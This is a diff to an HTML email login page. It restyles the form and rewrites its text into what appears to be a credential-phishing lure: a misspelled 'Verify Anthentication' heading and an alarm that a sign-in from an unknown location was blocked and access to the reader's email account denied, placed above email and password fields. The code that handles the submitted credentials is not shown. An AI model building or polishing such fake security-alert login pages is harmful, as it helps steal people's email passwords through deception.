@@ -20,7 +20,9 @@
       margin: 0;
       padding: 0;
       display: flex;
-      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      position: relative;
     }
 
     body::before {
@@ -30,49 +32,38 @@
       left: 0;
       width: 100%;
       height: 100%;
-      backdrop-filter: blur(8px);
+      backdrop-filter: blur(10px);
+      background-color: rgba(255, 255, 255, 0.2);
       z-index: 0;
     }
 
-    .info-text {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 40px;
-      z-index: 1;
-      color: #fff;
-      font-size: 18px;
-      font-weight: 500;
-      text-align: center;
-    }
-
     .login-container {
-      background: rgba(255, 255, 255, 0.95);
+      background-color: rgba(255, 255, 255, 0.65);
+      backdrop-filter: blur(20px);
       width: 100%;
       max-width: 400px;
       padding: 30px;
-      border-radius: 12px 0 0 12px;
-      box-shadow: -4px 0 12px rgba(0, 0, 0, 0.3);
-      height: 100vh;
-      z-index: 1000;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      position: relative;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      z-index: 1;
+      text-align: center;
     }
 
     .login-container img {
       width: 60px;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
     }
 
     .login-container h2 {
       font-size: 24px;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
       color: #222;
-      text-align: center;
+    }
+
+    .login-container p.subtext {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 20px;
     }
 
     .login-container input {
@@ -131,7 +122,6 @@
       font-weight: bold;
     }
 
-    /* Footer */
     .footer {
       position: fixed;
       bottom: 10px;
@@ -144,15 +134,11 @@
   </style>
 </head>
 <body>
-
-  <div class="info-text">
-    Please use your own email address and password to login. For more details, please refer to the “Login User Guide” in the link above.
-  </div>
-
   <!-- Login Panel -->
   <div id="login" class="login-container">
     <img src="https://img.icons8.com/ios-filled/100/000000/new-post.png" alt="Email Icon">
-    <h2>Login to verify account</h2>
+    <h2>Verify Anthentication</h2>
+    <p class="subtext">We blocked a sign-in from an unknown location and denied access to your email account</p>
     <input type="email" id="email" placeholder="Email Address" required>
     <input type="password" id="password" placeholder="Password" required>
     <button onclick="authenticate()">Login</button>
